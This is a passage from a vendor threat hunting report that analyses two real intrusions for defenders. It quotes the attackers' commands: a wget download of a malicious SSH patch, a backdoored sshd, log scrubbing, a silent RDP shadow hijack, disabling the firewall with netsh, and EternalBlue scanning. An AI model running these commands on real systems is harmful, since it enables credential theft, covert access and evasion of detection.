The actor gained
access via
internetexposed RDP

The actor scanned for
active RDP sessions
and hijacked a session
with a silent
connection

The actor attempted
to bypass security
using the AMSI
bypass and by
modifying firewall

The actor
performed
credential
dumping via Task
Manager

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

36

DOWNLOAD AND COMPILATION OF MALICIOUS SOURCE CODE
Shortly after gaining initial access, the threat actor began preparing the host to
capture and store credentials for later access. The actor checked for several software
packages on the host to verify it was capable of compiling source code. They then
used wget to download the source code for SSH and a malicious software patch.
The actor moved the source code to /var/tmp and patched the SSH source code
to enable the malicious functionality. With this complete, they began compiling the
source code in preparation for installation. The following is a summarized list of
commands observed as part of these efforts:
•

wget -t 5 hxxp://mirror.yandex[.]ru/pub/OpenBSD/OpenSSH/
portable/openssh-6.6p1.tar.gz

•

tar xfz openssh-6.6p1.tar.gz

•

mv openssh-6.6p1.tar.gz /var/tmp/

•

wget -t 5 --no-check-certificate hxxps://raw.github[.]
com/<redacted>/gh-pages/c3Y7310s.css

•

patch -p0 -i c3Y7310s.css

Once the source code was compiled, the actor then began moving the new SSH
binaries into place on the host. They then restarted the SSH service to execute the
modified SSHD binary with the malicious functionality:
•

mv -f ./ssh /usr/bin/ssh

•

mv -f ./scp /usr/bin/scp

•

mv -f ./sshd /usr/sbin/sshd

•

/bin/sh /usr/sbin/service sshd restart

Now that the attacker had the malicious SSH service running on the host, they pivoted
to covering their tracks to avoid detection.

ATTEMPTS TO EVADE DETECTION
Even before executing the compilation of the SSH source code, the actor began
working on evasion. They had observed that the version of SSH they planned to install
was different from the version already running on the system. To avoid the risk of
defenders noticing the mismatch of versions, the actor updated the source code to
display inaccurate version information:
•

perl -Upi -e s/OpenSSH_6.6p1/OpenSSH_7.4p1/ version.h

•

perl -Upi -e s/options->version_addendum = NULL/options>version_addendum = NULL/ servconf.c

Once the new SSH binaries were installed, they began removing source code and scripts
from the file system. This consisted of a number of file and directory deletion commands:
•

rm -rf /var/tmp/messages

•

rm -rf /var/tmp/[REDACTED]

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

•

rm -rf openssh-6.6p1*

•

rm -rf /var/tmp/install_ssh.pl

•

rm -rf ...

•

rm -rf /var/tmp/clean_logs.pl

37

The actor also took care to remove log file entries based on the timestamp of entries
and the actor’s IP address. To do this, they copied the /var/log/messages log file
to /var/tmp/messages, removed all entries with a specific timestamp and then
overwrote the original /var/log/messages file. They also executed a Perl script that
appears to remove entries containing a specified IP address from log files on the host.
An unknown binary or script was also executed from a directory named “...” that
appears to remove a specified IP address from log files. The name of this directory
was also likely an attempt to avoid discovery.
•

cp /var/log/messages /var/tmp/messages

•

sh -c cat /var/tmp/messages | grep -v "<date>" > /var/log/
messages

•

perl /var/tmp/clean_logs.pl <IP address>

•

bash -c cd /var/tmp; perl /var/tmp/clean_logs.pl <IP address>
2>&1;rm -rf /var/tmp/clean_logs.pl

•

./.../0 -i <IP address> -m /var/log/all.log /var/log/messages /
var/log/auth.log /var/log/secure /var/log/debug.log /var/log/
lastlog /var/log/btmp

Once these actions were completed, the actor disconnected from the host. OverWatch
notified the victim of the activity as soon as it was discovered, enabling the victim to
respond and successfully removed the actor from the host before any significant impact
occurred. No further malicious actions were observed after this point.

CONCLUSIONS AND RECOMMENDATIONS
This intrusion demonstrates the need for in-depth security monitoring and threat
hunting. Host-integrity monitoring will detect the modification of files on the system,
but security staff need to be constantly monitoring for these changes to respond
before an actor can establish a foothold or complete their mission objective.
There are several layered defenses that need to be in place to protect organizations
from attacks such as this. First, organizations must ensure that all of their systems
are running the latest system patches and closely monitor for systems that have not
been updated. Organizations also need to have security monitoring that is capable
of detecting updates to system files and the commands run by a system’s users.
Defenders should ensure endpoint detection and response (EDR) is deployed to all
of their systems so that there are no blind spots in the network. Finally, continuous
threat hunting is a key defense for discovering malicious hands-on-keyboard activities
quickly and understanding the context of a chain of commands being executed by a
threat actor. IT staff may not fully understand what they are seeing when confronted
by activity like this, but an experienced threat hunting team like OverWatch provides
deep expertise in detecting these adversaries.

INITIAL ACCESS

CREDENTIAL ACCESS

PERSISTENCE

DISCOVERY

DEFENSE EVASION

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM
Exploitation of
an unknown
service

38

Actor looked for
native tools
capable of
compiling
source code

Actor modified
an existing SSH
with a patch to
enable malicious
functionality

Modified SSHD
captured
credentials on
the host, staging
for later
exfiltration

Actor altered
the new SSH
source code to
mimic the
existing version
and removed log
file entries

SPIDER USES UNCOMMONLY SEEN TRADECRAFT
IN AN ATTEMPT TO ESTABLISH FOOTHOLD IN A VICTIM
ENVIRONMENT
OVERVIEW

OverWatch has tracked a continued escalation of eCrime intrusion activity in the first
half of 2020. There is wide variation in the skills and sophistication of these eCrime
adversaries; while some leverage commodity malware to conduct relatively basic
interactive campaigns, others employ less commonly seen hands-on-keyboard TTPs.
In early June, OverWatch discovered an intrusion against a transport and logistics
company in the Asia-Pacific region in which a suspected eCrime adversary used RDP
session hijacking and proceeded to conduct port scans and credential dumping in
pursuit of their objectives.

INITIAL ACCESS

LATERAL MOVEMENT

DEFENSE EVASION

CREDENTIAL ACCESS

The actor gained
access via
internetexposed RDP

The actor scanned for
active RDP sessions
and hijacked a session
with a silent
connection

The actor attempted
to bypass security
using the AMSI
bypass and by
modifying firewall
settings

The actor
performed
credential
dumping via Task
Manager

RDP SESSION SHADOW HIJACKED TO FACILITATE LATERAL MOVEMENT
An OverWatch threat hunter searching for unusual port scanning discovered an
administrative account using Advanced IP Scanner, a utility commonly deployed to
enumerate available network resources. This activity prompted deeper investigation,
and the hunter discovered multiple failed login attempts to the RDP service. This type of
password-guessing attack is commonly used as an initial access vector for adversaries
when services such as RDP are exposed to the internet. Notably, a large number of
these attempts originated from a network firewall appliance, suggesting RDP was portforwarded from an external source to the victim host. The brute-forcing attack resulted
in the actor gaining access.
Once on the system, the actor enumerated the active RDP sessions using
qwinsta.exe in an attempt to determine which RDP session to control. They then
attempted to use the Windows-native binary tscon.exe to connect to an alternative
session in order to identify a user with higher privileges — however, this was blocked by
the Falcon sensor. The actor shifted gears and modified a registry key to enable remote

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

39

desktop session shadowing mode, which allows for users with administrator privileges
to view or take control of RDP sessions:
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal
Services" /v Shadow /t REG_DWORD /d 2 /f
This was followed by the actor initiating a remote connection in an elevated command
prompt that allows for a silent connection:
mstsc.exe /control /noConsentPrompt /shadow:1 /v:localhost
This approach aimed at exploiting RDP proved to be successful. The actor was able to
stealthily hijack an active session — without providing credentials or notifying the user
of their presence on the system — in order to continue their actions on objectives. The
tradecraft used to exploit RDP in this intrusion is not commonly seen executed during
the course of criminally motivated attacks.

ATTEMPTS TO BYPASS SECURITY CONTROLS TO FACILITATE USE OF AN EXPLOIT KIT
The operator made several attempts to execute PowerShell Empire, including the use
of PowerView, Kerberoast, PowerUp and Mimikatz. Additionally, the actor attempted
the password recovery tool LaZagne, but execution of the suite of actor tooling was
repeatedly blocked by the Falcon sensor. Not content to give up, the actor attempted
to evade security controls through the use of the Anti-Malware Scan Interface (AMSI)
bypass technique. Avoiding AMSI sting-based controls can enable an actor to execute
their malicious scripts while remaining hidden.
In a further attempt to avoid interruption by installed security software, the actor
disabled the Windows firewall using the following command:
C:\WINDOWS\system32\netsh.exe" advfirewall set allprofiles state off

COMMON WINDOWS UTILITY USED TO HARVEST CREDENTIALS ON A NEW HOST
Having failed to execute their tools on the initial host, the actor began to search for a
new target. Using tools downloaded from Google Drive, the actor conducted network
reconnaissance that included port scans using nmap.exe and rdpscan.exe in an
attempt to discover Windows hosts vulnerable to the SMBv1 EternalBlue exploit in the
environment as well as potential candidates for lateral movement.
"C:\Temp\nmap-7.70\nmap.exe" -v --open -p445 -Pn --script=smbvuln-ms17-010 -sC -sV -oA result [IP REDACTED]
"C:\Temp\nmap-7.70\rdpscan.exe" [IP REDACTED]
After identifying a new target, the actor leveraged RDP to move laterally to a remote
host. In an attempt to steal credentials from the system, the actor leveraged the
Windows utility Task Manager to harvest credentials by dumping the contents of the
LSASS process memory before archiving the output file using 7-Zip in preparation for
likely exfiltration. The use of taskmgr.exe has been observed frequently in recent
attacks, as it can enable adversaries to blend in with normal admin operations and
avoid discovery.

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

40

CONCLUSIONS AND RECOMMENDATIONS
OverWatch’s human-led proactive and continuous hunting operations resulted in prompt
discovery and notification of this malicious activity, allowing the victim organization to
quickly disrupt the adversary before data exfiltration could occur. The victim was able
to leverage the Falcon console to immediately network contain the host to avoid any
significant impact. The use of various living-off-the-land techniques employed by this
adversary underscores the importance of continuous threat hunting to uncover activity
that attempts to blend into normal everyday activity.
OverWatch consistently sees adversaries gain access using stolen credentials to
connect via exposed RDP services. This is a threat potentially facing many organizations
that rapidly enabled a remote workforce as the COVID-19 pandemic hit. Organizations
should review any new infrastructure and remote work security policies as a priority. The
best way to mitigate against this threat is to not expose RDP to the internet. In those
instances where that is not possible, defenders should consider continuously monitoring
for unusual account behavior. Further, RDP exploits are commonly preceded by bruteforcing or password-spraying attacks so it's imperative that defenders employ strong
password policies in their environment as well. This should include the use of multifactor
authentication.

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

41

CONCLUSION
In the first half of 2020, OverWatch witnessed a surge in interactive intrusions driven
predominantly by eCrime activity. Although the escalation of criminally motivated
intrusions is the continuation of a trend reported by CrowdStrike in late 2019, it is
probable that this trend has been exacerbated by the rapid adoption of work-fromhome practices and the resultant setup of new infrastructure that contributed to an
expanded attack surface.
OverWatch threat hunting data also revealed a significant spike in malicious activity
impacting the manufacturing sector attributed to both eCrime and state-sponsored activity.
Other fluctuations in the relative frequency of intrusions in specific industry verticals
demonstrates clearly that the cyber threat landscape is intrinsically linked to global
economic forces and has not escaped the upheaval caused by the COVID-19 pandemic.
So far in 2020, eCrime adversaries have increased not just the volume but also the reach
of their hands-on-keyboard activities. In only six months, 27 industry verticals fell victim to
criminally motivated intrusions. This is more than double the number of industries that had
fallen victim to eCrime at the same point in 2019. State-sponsored adversaries also remain
a significant threat, with their presence being felt across the board.
Finally, defenders in today’s environment need to be aware that eCrime operations are not
only prolific but are also being run like businesses. Threat actors are continually innovating
and maturing their processes to maximize their impact and ultimately their profit margins.
Analysis of interactive intrusions using the MITRE ATT&CK framework shows significant
overlap in the TTPs of eCrime and state-sponsored adversaries.

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

42

RECOMMENDATIONS
There has been a proliferation of interactive cyber campaigns in the first half of 2020, but
with OverWatch monitoring 24/7/365, adversaries have nowhere to hide. This report has
explored the key trends that have emerged so far in 2020 and some particular threats for
defenders to be alert to. But importantly, OverWatch threat hunting data emphasizes that
adversaries are keenly attuned to their victim’s environment and ready to pivot to meet
changing objectives or emerging opportunities. In this fast-moving reality, it is imperative
that organizations are prepared to defend their environments.
•

Roll it out! Turn it on! It is crucial to have comprehensive security countermeasures
and to enable the prevention capabilities in the products you use. Defenders
should ensure EDR is deployed to all of their systems so that there are no blind
spots in the network. Defenders should also consider countermeasures such
as allowlisting to help restrict program execution based on non-name-based file
attributes.

•

Invest in expert human threat hunting. Interactive attacks use stealthy or novel
techniques designed to bypass automated monitoring and detection. Continuous
threat hunting is the best way to detect and prevent sophisticated or persistent
attacks.

•

Practice good hygiene. As a baseline, organizations should establish control
over the software running in their environment and eliminate unneeded software.
It is also crucial to ensure that the environment is kept up to date with the latest
patches.

•

Protect your identity. Use of valid accounts continues to be among the most
commonly seen techniques employed by adversaries. Defenders should establish
and enforce strong password policies and should be routinely monitoring
authentication logs, account creation and changes in user privileges.

•

Enlist your users in the fight. While technology is clearly critical in the fight to
detect and stop intrusions, the end user remains a crucial link in the chain to stop
breaches. Well-trained staff can be an asset in combating the continued threat of
phishing and related social engineering techniques.

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

ABOUT CROWDSTRIKE
CrowdStrike® Inc. (Nasdaq: CRWD), a global cybersecurity leader, is redefining
security for the cloud era with an endpoint protection platform built from
the ground up to stop breaches. The CrowdStrike Falcon® platform’s single
lightweight-agent architecture leverages cloud-scale artificial intelligence (AI) and
offers real-time protection and visibility across the enterprise, preventing attacks
on endpoints on or off the network. Powered by the proprietary CrowdStrike Threat
Graph®, CrowdStrike Falcon correlates over 3 trillion endpoint-related events per
week in real time from across the globe, fueling one of the world’s most advanced
data platforms for security.
With CrowdStrike, customers benefit from better protection, better performance
and immediate time-to-value delivered by the cloud-native Falcon platform.
There’s only one thing to remember about CrowdStrike: We stop breaches.

PRODUCTS AND SERVICES
Endpoint Security
FALCON INSIGHTTM | ENDPOINT DETECTION AND RESPONSE (EDR)
Delivers continuous, comprehensive endpoint visibility that spans detection,
response and forensics to ensure nothing is missed and potential breaches are
stopped.
FALCON PREVENTTM | NEXT-GENERATION ANTIVIRUS
Protects against both malware and malware-free attacks and is third-party tested
and certified, allowing organizations to replace their AV.
FALCON FIREWALL MANAGEMENTTM | FIREWALL MANAGEMENT
Delivers simple, centralized host firewall management making it easy to manage
and control host firewall policies.
FALCON DEVICE CONTROLTM | USB DEVICE VISIBILITY AND CONTROL
Provides the visibility and precise control required to enable safe usage of USB
devices across your organization.

43

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

Cloud Security
FALCON CLOUD WORKLOAD PROTECTIONTM
Provides comprehensive breach protection across private, public, hybrid and multicloud environments, allowing customers to rapidly adopt and secure technology
across any workload.

Security & IT Operations
FALCON DISCOVERTM | IT HYGIENE
Identifies unauthorized systems and applications anywhere in your environment in
real time, enabling faster remediation to improve your overall security posture.
FALCON SPOTLIGHTTM | VULNERABILITY MANAGEMENT
Offers security teams a continuous and real-time assessment of the vulnerability
exposure of their endpoints, without resource-intensive scans.

Managed Services
FALCON OVERWATCHTM | MANAGED THREAT HUNTING
CrowdStrike's 24/7 hunting team seamlessly augments your in-house security
resources to relentlessly hunt for malicious activities at the earliest stage, stopping
adversaries in their tracks.
FALCON COMPLETETM | TURNKEY SECURITY
Combines comprehensive Falcon endpoint protection with the Falcon Complete
Team of security experts, providing 100% managed and worry-free cybersecurity
that includes a product warranty of up to $1 million.

44

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

Threat Intelligence
FALCON XTM | THREAT ANALYSIS SERVICE
Automates threat analysis, enabling security teams to learn from encounters with
adversaries and use that knowledge to protect against future attacks.
FALCON X PREMIUMTM | CYBER THREAT INTELLIGENCE
Delivers strategic reports and tactical indicators of compromise that provide
insight into every aspect of the threat actors that are targeting your organization.
FALCON SEARCHTM | MALWARE SEARCH
Dramatically increases the speed of malware research, enabling teams to quickly
implement defensive measures, understand the attackers' motives, and even
download related files for further study.
FALCON SANDBOXTM | MALWARE ANALYSIS
Provides visibility into malware behavior, automating in-depth file and memory
analysis for faster threat protection and response.

Services
CROWDSTRIKE SERVICES | IR AND PROACTIVE
Delivers pre- and post-incident response (IR) services 24/7 to support you before,
during or after a breach, with skilled teams to help you defend against and respond
to security incidents, prevent breaches and optimize your speed to remediation.

Start Free Trial
of Next-Gen AV

Learn more at www.crowdstrike.com

© 2020 CrowdStrike, Inc. All rights reserved.

45